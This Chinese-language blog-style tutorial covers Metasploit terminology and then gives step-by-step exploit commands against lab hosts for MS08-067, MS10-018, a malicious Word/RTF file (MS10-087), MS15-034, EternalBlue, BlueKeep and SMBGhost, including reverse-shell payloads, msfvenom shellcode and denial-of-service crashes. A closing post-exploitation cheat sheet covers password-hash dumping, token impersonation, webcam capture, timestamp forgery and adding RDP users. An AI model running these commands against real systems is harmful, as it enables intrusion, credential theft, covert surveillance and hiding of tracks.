## 轩公子msf

MSF专业术语讲解

渗透攻击（Exploit）

渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。

流行的攻击技术包括：缓冲区溢出、Web应用程序漏洞攻击，以及利用配置错误等。



攻击载荷（Payload）

攻击载何是我们期望目标系统在被渗透攻击后而执行的代码。在MSF框架中可以自由的选择、传送和植入。比如，反弹式shell是一种从目标主机到攻击主机创建网络连接，并提供命令行shell的攻击载荷。bind shell攻击载荷则在目标主机上将命令行shell绑定到一个打开的监听端口，攻击者可以连接这些端口来取得shell交互。



溢出代码（Shellcode）

shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令后，才会提供一个命令行shell或者Meterpreter shell，这也是shellcode名称的由来。



模块（Module）

在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候，你可能会使用一个渗透攻击模块（Exploit module），也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用一个辅助模块（auxiliary module），用来扫描一些诸如扫描或系统查点的攻击动作。



监听器（Listener）

监听器是MSF中用来等待连入网络连接的组件。举例来说，在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。



## msfconsole相关命令

```
search      搜索模块
use         使用模块
back        返回
connect     连接
exit        退出
info        查看模块具体信息
irb         进入rib脚本模式
jobs        显示和管理作业
kill        杀死进程
loadpath    加载一个模块的路径
quit        退出MSF
load        加载一个插件
resource    运行储存一个文件中的命令
route       查看一个会话的路由信息
save        保存动作
set         给一个变量赋值
show option 显示模块用法
setg        把一个赋值给全局变量，例如上述set设置的IP，就会用到其他攻击模块的RHOST中。
sleep       在限定的秒数内什么也不做
unload      卸载一个模块
unset       解出一个或多个变量
unsetg      解出一个或多个全局变量
version     显示MSF和控制台库版本
```

### Exploits模块

```
命名规则：系统/服务/名称
例如：windows/smb/ms08_067_netapi
RHOST：目标主机IP地址
RPORT：目标主机连接端口
Payload：有效的载荷，成功后返回shell
LHOST：攻击者的IP地址
LPORT：攻击者的端口
```



### Payloads模块

```
是在使用一个模块之后再去使用的
命名规则：系统/类型/名称
例如：Windows/dllinject/reverse_tcp
类型命名规则
shell：上传一个shell
dllinject：注入一个dll到进程
patchup***：修补漏洞
upexec：上传并执行一个文件
meterpreter：高级的payload
vncinject：高级的payload
passive：高级的payload
名称的命名规则
shell_find_tag:在一个已建立的连接上创建一个shell
shell_reverse_tcp:反向连接到攻击者主机并创建一个shell
bind_tcp:监听一个tcp连接
reverse_tcp:反向建立tcp连接
reverse_http:通过HTTP隧道通信并创建一个新用户添加到管理组
add_user:创建一个新用户并添加到管理组
xxx_ipv6_tcp:基于IPV6
xxx_nonx_tcp:no execute或win7（NX是应用在CPU的一种可以防止缓冲区溢出的技术）。
xxx_ord_tcp:有序payload
xxx_tcp_allports:在所有可能的端口
```



## MSF漏洞实例测试

## 网络服务器攻击渗透（MS08-067）

```
search ms08_067
use exploit/windows/smb/ms08_067_netapi
set rhosts 10.4.7.50
set payload generic/shell_bind_tcp
exploit 
```

弹出提示 大概率版本问题 windows server 2003  网上的复现教程为xp

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQZfYqCcbw9hdiayClad3IIInCQSIiahcc9Zz1LakrlRXR7NrKhdYKJNOEQdNaGBqO02Kh8oxHFicjxicA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



## 浏览器攻击渗透（MS10-018）

```
search  ms10-018
use exploit/windows/browser/ms10_018_ie_behaviors
set srvhost 10.4.7.20
set payload windows/meterpreter/bind_tcp
exploit 
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQZfYqCcbw9hdiayClad3IIIn9Jmicxldtf8vPibLz8t2XAQHhwNfS6no2AEW1VI8At11mjrkcEV7LJZQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



应用软件格式渗透，利用word去渗透（MS10-087）

打开文档 让它弹出计算器

```
search MS10-087
use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
show options 
set filename ceshi.rtf
set payload windows/exec
set cmd calc.exe
exploit
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQZfYqCcbw9hdiayClad3IIInIFa2cLCHGBialHa97jVXKgicDiauGeNgr8ALnPkshN2ytN4O7avCdRLxA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



## CVE-2015-1635-HTTP.SYS远程执行代码漏洞（ms15-034）

读取内存数据

```
search ms15-034use
auxiliary/scanner/http/ms15_034_http_sys_memory_dump
set rhost 10.4.7.50
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQZfYqCcbw9hdiayClad3IIInyAK3EfRbJgYcqMQ7VhjFlQg02bYoADoiaibMAyibcdWeIabHUaK6KrSkg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

蓝屏攻击

```
use auxiliary/dos/http/ms15_034_ulonglongadd
set rhosts 10.4.7.22
set threads 10
run
```

这个win7 不给我面子 。。。



## 永恒之蓝（MS17-010）

```
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set rhost 10.4.7.22
set payload windows/x64/meterpreter/reverse_tcp
set lost 10.4.7.20 
set lport 4444
exploit
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQZfYqCcbw9hdiayClad3IIInWBARqXM5e5mOYINpBYQ2nruDncoyKSSxia2TSSvYpPcOQ0ldEhXqYYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





## 远程3389（CVE-2019-0708）与MS12-020

```
use  auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set rhosts 10.4.7.22
set rport 3389
run
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQZfYqCcbw9hdiayClad3IIInuiat3xlHXeJhJR2WAMdLou3ZEH31yDfrIIic0nuotYEg5iaNrictDAPVNA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



```
apt-get install python3-pip
pip3 install impacket
git clone https://github.com/n1xbyte/CVE-2019-0708.git
cd CVE-2019-0708
python3 crashpoc.py 10.4.7.22 64 
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQZfYqCcbw9hdiayClad3IIInCQMLV1AD7T5D0xfayhunBkYhHD2hM2RyB9kiaLRNbRibFIAgMyPbBzgQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



## 永恒之黑 (CVE-2020-0796)



蓝屏攻击



```
git clone https://github.com/ollypwn/SMBGhost.git
cd SMBGhost/
python3 scanner.py 10.4.7.30
```

```
Traceback (most recent call last):
  File "scanner.py", line 4, in <module>
    from netaddr import IPNetwork
ModuleNotFoundError: No module named 'netaddr'
```

pip3 install netaddr 

```
it clone https://github.com/eerykitty/CVE-2020-0796-PoC
cd CVE-2020-0796-PoC/
python3 CVE-2020-0796.py  10.4.7.30
```

getshell

```
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b '\x00' -i 1 -f python
```

*用生成的shellcode将exploit.py中的这一部分替换掉（buf后的字符串，保留USER_PAYLOAD不变）*

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set lport 8888 //监听端口
set rhost 10.4.7.30  //目标主机
run
```

SMB版本扫描

```
use auxiliary/scanner/smb/smb_version
```

SSH版本扫描

```
use auxiliary/scanner/ssh/ssh_version
```

TFP版本扫描

```
use auxiliary/scanner/ftp/ftp_version
```



后渗透测试

```
上传文件到Windows主机
upload <file> <destination> 

upload //root//123.exe c:\\123.exe


下载
download file  path

执行exe
execute 123.exe

创建cmd通道
execute -f  cmd -c

显示进程
ps

获取dos窗口
shell

提权
getsystem


获取hash
hashdump

使用Credcollect转储hash值
run credcollect 


创建端口转发
portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口

删除端口转发
portfwd delete -l <portnumber> -p <portnumber> -r <Target IP> 

在目标主机上搜索文件
search -f *.txt

查看当前用户
getuid

获取主机信息
sysinfo

模拟任意用户(token操作)
use incognito 
list_tokens -u 
impersonate_token “Machine\\user”

webcam_list  #查看摄像头
webcam_snap   #通过摄像头拍照
webcam_stream   #通过摄像头开启视屏

timestomp伪造时间戳
timestomp C:// -h   #查看帮助
timestomp -v C://2.txt   #查看时间戳
timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt


enable_rdp脚本开启3389
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662
```